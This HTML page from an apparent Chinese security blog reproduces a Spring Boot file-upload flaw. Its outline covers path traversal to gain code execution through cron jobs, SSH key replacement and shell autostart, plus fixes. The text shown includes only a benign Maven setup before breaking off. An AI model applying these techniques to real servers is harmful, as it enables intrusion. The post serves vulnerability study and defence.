@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SpringBoot框架文件上传的Trick前言Spring Boot 是一款基于 Spring 框架的快速开发 Web 应用的工具。它提供了很多功能强大的框架和引擎，如 Thymeleaf、Freemarker、Mustache 等，能够帮助开发者高效、便捷地实现各种需求。与其它框架不同的是，Spring Boot 应用程序默认不解析 JSP 页面。而且tomcat中间件大多数都是嵌入在jar里">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringBoot框架文件上传的Trick">
+<meta property="og:url" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="SpringBoot框架文件上传的Trick前言Spring Boot 是一款基于 Spring 框架的快速开发 Web 应用的工具。它提供了很多功能强大的框架和引擎，如 Thymeleaf、Freemarker、Mustache 等，能够帮助开发者高效、便捷地实现各种需求。与其它框架不同的是，Spring Boot 应用程序默认不解析 JSP 页面。而且tomcat中间件大多数都是嵌入在jar里">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/5DmosnH-tD3mC-N-ioN7tJQBcKtBt0JPWyjhVMb0f5w.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/b3lrSaAlhzIEXKcmYzLvVuZQGYF_ZdsIqy62q5V5nos.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/h1mC7F40eZwUsfG12qasbTN4h-cd97EXAlPHBYtHT3E.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/er7fUH0g_Q1SpDLVKEyVZLwqnPjk8BF4Rlx_nPYm8dk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/mneJQZ2ipF-gG62PrXKr81ofOpE505V_5LxwpngyMpk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/Exco-E0VA0wqPqXgMVvYFh12-2UY4yrQ9kagV1HX8xk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/iDHLMQQEZgtWRQ-pW3bQgUvigAYEIlS35YhTK63V5r0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/wPg3ggGvrpfNYLYDCyN1nc4dQz42CznP0j1ZQVixRxY.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/WGAt0yGrhfdXbrH6oAAoQsLr0thekpiAFk7OygfLqy0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/VXATVhlY5wJYk0oify4c9vRQONdzyplim76_ffj9iC4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/iPsmnagjEdqeXm3IfZCu0ZQ4pyF8Ans1hptIYUaBt4k.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/w-T-uEWIvr7VE0c8qV5Sclx78sDAFm8MCIGrGbdyB2M.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/9Vjk45DGx0fjcBLIPia2KhUQHqawRsCG0MM5TzveXEI.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/voFm36i6iPJqyHd-aNc-bPj0mmMrv4Q7zeg6P7CeN3o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/lPBuRzds7-sLeJ86IlkSlaKHu2k9rmgB9Q5CCafFoqE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/2NFurrmX1tT7Guq9hNa0Z9-SU5VDlKI6OERFtbisSeU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/x67OuJ4x5fgfB7K54tK15ZuJaCdo2rPDkD0J60-MPI8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/0imi-hY6u5bns_al8-Dpqg1a0gTEfcWlxOSj8_a3HCQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/2A3ex48KgqF9Ql6WN6Iv6L141g7dL_y52uhe8qu1Wzk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/N1O8-V_1aCtxhLa9G0zhlopo-lQGW2WQVlZm47AqEYw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/bSH3OXbHwr4w4dHdzIFEgegftTMo_mA_IAbLHnuEF7k.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/UIHjG8HHEdBNN6B5RMh_lyY3IxMvTVm13AwogI0HPxo.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/8v_pdpxtzMKK3unNGR9ldrJy_tNtxFxKC6qU3NPaiMk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/sVic4p5hZcyvGEYzU_kckPrS9KCWX5V23amwZL7iB9s.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/vmN311G5GMwurYSwNknSgmf9XnjgG46zKYbbUYq_2MA.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/7xZAqA1rvcxD2ipf4lkvOjFnVgw0k4BidEAL6czMn2U.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/POxR2yuZM6rjd0boyPSmQklQvQwgNVM5vokAPETDRpw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/tw-G7X0ckGwkYRW9uzgAtFbquGXN7vxYzwpBGQypdaU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/5M_X1qjCQagqhCZ1tVRDVsGRgWiX_FT7Vu4ZOzj3RQQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/zmoOoI01LzlICJYnopinXNmyhsXCiydjP9RXXgLFX4s.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/OmAUDMK0Nx_duQtx8GS-ziogLfdaunfMIWqcIVm_R8E.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/rDRU9a4qMuz3H1GxpFiq9xAMuwDQy7SE0jJlwx9KBvE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/Hf6RXf630FYN8pXGqJnB7ogXOr2gQY5GEpzAWx-pxHY.png">
+<meta property="article:published_time" content="2023-06-04T05:58:49.000Z">
+<meta property="article:modified_time" content="2023-06-04T05:58:55.445Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SpringBoot">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/5DmosnH-tD3mC-N-ioN7tJQBcKtBt0JPWyjhVMb0f5w.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SpringBoot框架文件上传的Trick</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/05/31/RocketMQ%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2023-33246%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&text=SpringBoot框架文件上传的Trick"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&is_video=false&description=SpringBoot框架文件上传的Trick"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpringBoot框架文件上传的Trick&body=Check out this article: https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&name=SpringBoot框架文件上传的Trick&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&t=SpringBoot框架文件上传的Trick"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick"><span class="toc-number">1.</span> <span class="toc-text">SpringBoot框架文件上传的Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">demo分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAspringboot%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">创建一个springboot项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEspringboot"><span class="toc-number">1.2.2.</span> <span class="toc-text">配置springboot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84demo"><span class="toc-number">1.2.3.</span> <span class="toc-text">文件上传的demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E4%B8%BAjar%E9%83%A8%E7%BD%B2%E5%88%B0Linux"><span class="toc-number">1.2.4.</span> <span class="toc-text">打包为jar部署到Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-x2F-%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用..&#x2F;指定文件存储目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E4%B8%80-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">利用姿势一(定时任务)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B7%AF%E5%BE%84%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用路径一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B7%AF%E5%BE%84%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用路径二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%88%E6%9B%BF%E6%8D%A2%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">利用姿势二（替换公钥）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%85%AC%E7%A7%81%E9%92%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">生成公私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">开启公钥登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">攻击者生成公钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E4%B8%89%EF%BC%88%E7%BB%88%E7%AB%AF%E8%87%AA%E5%90%AF%E5%8A%A8%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">利用姿势三（终端自启动）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9demo%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.7.</span> <span class="toc-text">对demo进行简单修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SpringBoot框架文件上传的Trick
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-04T05:58:49.000Z" class="dt-published" itemprop="datePublished">2023-06-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/SpringBoot/" rel="tag">SpringBoot</a>, <a class="p-category" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="SpringBoot框架文件上传的Trick"><a href="#SpringBoot框架文件上传的Trick" class="headerlink" title="SpringBoot框架文件上传的Trick"></a>SpringBoot框架文件上传的Trick</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Boot 是一款基于 Spring 框架的快速开发 Web 应用的工具。它提供了很多功能强大的框架和引擎，如 Thymeleaf、Freemarker、Mustache 等，能够帮助开发者高效、便捷地实现各种需求。与其它框架不同的是，Spring Boot 应用程序默认不解析 JSP 页面。而且tomcat中间件大多数都是嵌入在jar里面的。虽然这导致在灵活性和可扩展性方面具有优势，但如果没有适当的措施来处理上传文件的内容，就会给恶意用户提供机会，利用此漏洞获取系统权限，甚至造成数据泄露等严重后果。</p>
+<h2 id="demo分析"><a href="#demo分析" class="headerlink" title="demo分析"></a>demo分析</h2><h3 id="创建一个springboot项目"><a href="#创建一个springboot项目" class="headerlink" title="创建一个springboot项目"></a>创建一个springboot项目</h3><p>创建一个工程</p>
+<p><img src="5DmosnH-tD3mC-N-ioN7tJQBcKtBt0JPWyjhVMb0f5w.png" alt="image"></p>
+<p>FileUploadHazards</p>
+<p><img src="b3lrSaAlhzIEXKcmYzLvVuZQGYF_ZdsIqy62q5V5nos.png" alt="image"></p>
+<p><img src="h1mC7F40eZwUsfG12qasbTN4h-cd97EXAlPHBYtHT3E.png" alt="image"></p>
+<p>创建Java文件夹</p>
+<p><img src="er7fUH0g_Q1SpDLVKEyVZLwqnPjk8BF4Rlx_nPYm8dk.png" alt="image"></p>
+<h3 id="配置springboot"><a href="#配置springboot" class="headerlink" title="配置springboot"></a>配置springboot</h3><p>配置pom.xml</p>
+<p>放在 里面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 继承父包 --&gt;</span><br><span class="line">  &lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.0.7.RELEASE&lt;/version&gt;</span><br><span class="line">  &lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;!-- web启动jar --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.18.6&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"> &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>放在  <build>里面</build></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;resources&gt;</span><br><span class="line">  &lt;resource&gt;</span><br><span class="line">    &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class="line">    &lt;includes&gt;</span><br><span class="line">      &lt;include&gt;**/*.*&lt;/include&gt;</span><br><span class="line">    &lt;/includes&gt;</span><br><span class="line">    &lt;filtering&gt;<span class="literal">true</span>&lt;/filtering&gt;</span><br><span class="line">  &lt;/resource&gt;</span><br><span class="line">&lt;/resources&gt;</span><br></pre></td></tr></table></figure>
+<p>完整的pom.xml</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 